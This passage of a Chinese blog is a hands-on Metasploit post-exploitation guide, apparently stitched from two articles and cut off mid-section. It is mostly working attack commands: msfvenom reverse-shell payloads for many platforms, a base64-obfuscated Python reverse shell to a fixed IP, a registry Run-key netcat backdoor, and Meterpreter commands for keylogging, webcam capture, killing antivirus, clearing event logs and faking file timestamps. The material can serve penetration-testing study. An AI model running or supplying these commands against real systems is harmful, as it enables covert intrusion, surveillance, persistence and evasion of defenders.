HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msf基本命令-2"><a href="#2-msf基本命令-2" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure><h2 id="3-msfvenom生成payload-2"><a href="#3-msfvenom生成payload-2" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-Meterpreter基本命令-2"><a href="#4-Meterpreter基本命令-2" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-2"><a href="#4-1-基本系统命令-2" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><h3 id="4-2-文件系统命令-2"><a href="#4-2-文件系统命令-2" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-网络命令-2"><a href="#4-3-网络命令-2" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure><h3 id="4-4-信息收集-2"><a href="#4-4-信息收集-2" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure><h3 id="4-5-提权-2"><a href="#4-5-提权-2" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure 